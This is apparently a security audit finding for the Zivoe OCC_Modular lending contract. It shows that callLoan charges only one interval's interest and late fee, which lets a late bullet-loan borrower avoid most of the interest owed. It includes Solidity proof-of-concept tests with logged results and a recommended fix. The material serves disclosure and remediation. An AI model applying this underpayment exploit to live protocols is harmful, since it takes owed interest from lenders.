---
id: 25758
severity: "Medium"
---

# When APR late rate is lower than APR, an OCC locker bullet loan borrower can pay way less interests by calling the loan

## Description



## Proof of Concept

## Vulnerability Detail

In `OCC_Modular` contract, the protocol can create loan offers, and users can accept them. The loan has two types, one being bullet, and the other being amortization. In the bullet loan, borrowers only need to pay back interests for each interval, and principle at the last term.

`amountOwed` returns the payment amount needed for each loan id:

```solidity
    function amountOwed(uint256 id) public view returns (
        uint256 principal, uint256 interest, uint256 lateFee, uint256 total
    ) {
        // 0 == Bullet.
        if (loans[id].paymentSchedule == 0) {
            if (loans[id].paymentsRemaining == 1) { principal = loans[id].principalOwed; }
        }
        // 1 == Amortization (only two options, use else here).
        else { principal = loans[id].principalOwed / loans[id].paymentsRemaining; }

        // Add late fee if past loans[id].paymentDueBy.
        if (block.timestamp > loans[id].paymentDueBy && loans[id].state == LoanState.Active) {
            lateFee = loans[id].principalOwed * (block.timestamp - loans[id].paymentDueBy) *
                loans[id].APRLateFee / (86400 * 365 * BIPS);
        }
        interest = loans[id].principalOwed * loans[id].paymentInterval * loans[id].APR / (86400 * 365 * BIPS);
        total = principal + interest + lateFee;
    }
```

And we see, there is a `lateFee` for any loans which is overdue. The later the borrower pays back the loan, the more late fees will be accumulated. Plus, the under writer role can always set the loan to default when it's way passed grace period. `callLoan` provides an option for borrowers to payback all he/she owes immediately and settles the loan. In this function, `amountOwed` is called once:

```solidity
    function callLoan(uint256 id) external nonReentrant {
        require(
            _msgSender() == loans[id].borrower || IZivoeGlobals_OCC(GBL).isLocker(_msgSender()),
            "OCC_Modular::callLoan() _msgSender() != loans[id].borrower && !isLocker(_msgSender())"
        );
        require(loans[id].state == LoanState.Active, "OCC_Modular::callLoan() loans[id].state != LoanState.Active");

        uint256 principalOwed = loans[id].principalOwed;
        (, uint256 interestOwed, uint256 lateFee,) = amountOwed(id);

        emit LoanCalled(id, principalOwed + interestOwed + lateFee, principalOwed, interestOwed, lateFee);

        // Transfer interest to YDL if in same format, otherwise keep here for 1INCH forwarding.
        if (stablecoin == IZivoeYDL_OCC(IZivoeGlobals_OCC(GBL).YDL()).distributedAsset()) {
            IERC20(stablecoin).safeTransferFrom(_msgSender(), IZivoeGlobals_OCC(GBL).YDL(), interestOwed + lateFee);
        }
        else {
            IERC20(stablecoin).safeTransferFrom(_msgSender(), OCT_YDL, interestOwed + lateFee);
        }

        IERC20(stablecoin).safeTransferFrom(_msgSender(), owner(), principalOwed);

        loans[id].principalOwed = 0;
        loans[id].paymentDueBy = 0;
        loans[id].paymentsRemaining = 0;
        loans[id].state = LoanState.Repaid;
    }
```

This means, only one interval's late fee is taken into account for this calculation. When the late fee rate is less than APR, and the payment is way overdue, it's possible for such borrower to skip a few interests and late fee payment.

```solidity
    function test_OCC_Late_Payment_Loan_ALL() public {
        uint256 borrowAmount = 20 * 10 ** 18;
        uint256 APR;
        uint256 APRLateFee;
        uint256 term;
        uint256 paymentInterval;
        uint256 gracePeriod;
        int8 paymentSchedule = 0;

        APR = 1000;
        APRLateFee = 500;
        term = 10;
        paymentInterval = options[1];
        gracePeriod = uint256(10 days) % 90 days + 7 days;
        mint("DAI", address(tim), 100 * 10 **18);
        hevm.startPrank(address(roy));
        OCC_Modular_DAI.createOffer(
            address(tim), borrowAmount, APR, APRLateFee, term, paymentInterval, gracePeriod, paymentSchedule
        );
        hevm.stopPrank();

        uint256 loanId = OCC_Modular_DAI.loanCounter() - 1;

        hevm.startPrank(address(tim));
        IERC20(DAI).approve(address(OCC_Modular_DAI), type(uint256).max);
        OCC_Modular_DAI.acceptOffer(loanId);
        (, , uint256[10] memory info) = OCC_Modular_DAI.loanInfo(loanId);
        hevm.warp(info[3] + (info[4] * term));
        uint256 balanceBefore = IERC20(DAI).balanceOf(address(tim));
        while (info[4] > 0) {
            OCC_Modular_DAI.makePayment(loanId);
            (, , info) = OCC_Modular_DAI.loanInfo(loanId);
        }
        uint256 balanceAfter = IERC20(DAI).balanceOf(address(tim));
        uint256 diff = balanceBefore - balanceAfter;
        console.log("paid total when payments are late for each interval:", diff);
        console.log("total interests:", diff - borrowAmount);
        hevm.stopPrank();
    }

    function test_OCC_Normal_Payment_Loan() public {
        uint256 borrowAmount = 20 * 10 ** 18;
        uint256 APR;
        uint256 APRLateFee;
        uint256 term;
        uint256 paymentInterval;
        uint256 gracePeriod;
        int8 paymentSchedule = 0;

        APR = 1000;
        APRLateFee = 500;
        term = 10;
        paymentInterval = options[1];
        gracePeriod = uint256(10 days) % 90 days + 7 days;
        mint("DAI", address(tim), 100 * 10 ** 18);
        hevm.startPrank(address(roy));
        OCC_Modular_DAI.createOffer(
            address(tim), borrowAmount, APR, APRLateFee, term, paymentInterval, gracePeriod, paymentSchedule
        );
        hevm.stopPrank();

        uint256 loanId = OCC_Modular_DAI.loanCounter() - 1;

        hevm.startPrank(address(tim));
        IERC20(DAI).approve(address(OCC_Modular_DAI), type(uint256).max);
        OCC_Modular_DAI.acceptOffer(loanId);
        (, , uint256[10] memory info) = OCC_Modular_DAI.loanInfo(loanId);
        hevm.warp(info[3]);
        uint256 balanceBefore = IERC20(DAI).balanceOf(address(tim));
        while (info[4] > 0) {
            OCC_Modular_DAI.makePayment(loanId);
            (, , info) = OCC_Modular_DAI.loanInfo(loanId);
            hevm.warp(info[3]);
        }
        uint256 balanceAfter = IERC20(DAI).balanceOf(address(tim));
        uint256 diff = balanceBefore - balanceAfter;
        console.log("paid total when loan is solved normally:", diff);
        console.log("total interests:", diff - borrowAmount);
        hevm.stopPrank();
    }

    function test_OCC_Late_Call_Loan() public {
        uint256 borrowAmount = 20 * 10 ** 18;
        uint256 APR;
        uint256 APRLateFee;
        uint256 term;
        uint256 paymentInterval;
        uint256 gracePeriod;
        int8 paymentSchedule = 0;

        APR = 1000;
        APRLateFee = 500;
        term = 10;
        paymentInterval = options[1];
        gracePeriod = uint256(10 days) % 90 days + 7 days;
        mint("DAI", address(tim), 100 * 10 ** 18);
        hevm.startPrank(address(roy));
        OCC_Modular_DAI.createOffer(
            address(tim), borrowAmount, APR, APRLateFee, term, paymentInterval, gracePeriod, paymentSchedule
        );
        hevm.stopPrank();

        uint256 loanId = OCC_Modular_DAI.loanCounter() - 1;

        hevm.startPrank(address(tim));
        IERC20(DAI).approve(address(OCC_Modular_DAI), type(uint256).max);
        OCC_Modular_DAI.acceptOffer(loanId);
        (, , uint256[10] memory info) = OCC_Modular_DAI.loanInfo(loanId);
        hevm.warp(info[3] + (info[4] * term));
        uint256 balanceBefore = IERC20(DAI).balanceOf(address(tim));
        OCC_Modular_DAI.callLoan(loanId);
        uint256 balanceAfter = IERC20(DAI).balanceOf(address(tim));
        uint256 diff = balanceBefore - balanceAfter;
        console.log("paid total when use `callLoan` at the end:", diff);
        console.log("total interests:", diff - borrowAmount);
        hevm.stopPrank();
    }
```

In the above test cases, all three of them will have the same borrower, and borrow the same loan, with same details and everything. One of them simulating when a borrower pays all charges normally till the end of term, another one waits till the very end to pay back the loan with late fees, and the last one also wait till the end, except calls `callLoan` to settle the loan instead of normally paying back each interval's amount.

After running the test cases, the following will be logged:

```plaintext
[PASS] test_OCC_Late_Call_Loan() (gas: 373730)
Logs:
  paid total when use `callLoan` at the end: 20076715499746321663
  total interests: 76715499746321663

[PASS] test_OCC_Late_Payment_Loan_ALL() (gas: 565561)
Logs:
  paid total when payments are late for each interval: 20767126458650431246
  total interests: 767126458650431246

[PASS] test_OCC_Normal_Payment_Loan() (gas: 569173)
Logs:
paid total when loan is solved normally: 20767123287671232870
total interests: 767123287671232870
```

As we can see, while `callLoan` also needs to pay the late fee penalty, it still charges way less than normally paying back the loan. This makes a borrower being able to skip a few interests fee, with the cost of little late fees.

## Impact

The PoC provided above is certainly an exaggerated edge case, but it's also possible when late fees are aribitrary, as long as the loan is not set to default by under writers, the borrower can skip paying quite some interest fees by exploiting this at the cost of a few late fees. This is more likely to happen when intervals are set to 7 days, as the minimum grace period is 7 days.

## Code Snippet

```solidity
    function callLoan(uint256 id) external nonReentrant {
        require(
            _msgSender() == loans[id].borrower || IZivoeGlobals_OCC(GBL).isLocker(_msgSender()),
            "OCC_Modular::callLoan() _msgSender() != loans[id].borrower && !isLocker(_msgSender())"
        );
        require(loans[id].state == LoanState.Active, "OCC_Modular::callLoan() loans[id].state != LoanState.Active");

        uint256 principalOwed = loans[id].principalOwed;
        (, uint256 interestOwed, uint256 lateFee,) = amountOwed(id);

        emit LoanCalled(id, principalOwed + interestOwed + lateFee, principalOwed, interestOwed, lateFee);

        // Transfer interest to YDL if in same format, otherwise keep here for 1INCH forwarding.
        if (stablecoin == IZivoeYDL_OCC(IZivoeGlobals_OCC(GBL).YDL()).distributedAsset()) {
            IERC20(stablecoin).safeTransferFrom(_msgSender(), IZivoeGlobals_OCC(GBL).YDL(), interestOwed + lateFee);
        }
        else {
            IERC20(stablecoin).safeTransferFrom(_msgSender(), OCT_YDL, interestOwed + lateFee);
        }

        IERC20(stablecoin).safeTransferFrom(_msgSender(), owner(), principalOwed);

        loans[id].principalOwed = 0;
        loans[id].paymentDueBy = 0;
        loans[id].paymentsRemaining = 0;
        loans[id].state = LoanState.Repaid;
    }
```

## Recommendation

Prohibits bullet loan borrowers from calling `callLoan` when the loan is late and still has more than 1 intervals to finish.
